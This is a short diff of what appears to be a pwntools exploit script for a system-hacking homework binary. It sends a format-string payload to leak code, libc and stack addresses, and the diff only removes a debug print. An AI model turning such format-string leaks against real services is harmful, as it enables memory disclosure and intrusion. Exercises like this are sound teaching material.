@@ -8,7 +8,6 @@ libc = ELF('./WHS/system_hacking_hw/problem/libc.so.6',checksec=False)
 pay = b'%70$p%71$p%72$p'
 p.sendlineafter(b'post?\n',pay)
 p.recvuntil(b'post:\n')
-print(p.recvline())
 code_leak = int(p.recv(14),16)
 libc_leak = int(p.recv(14),16)
 stack_leak = int(p.recv(14),16)
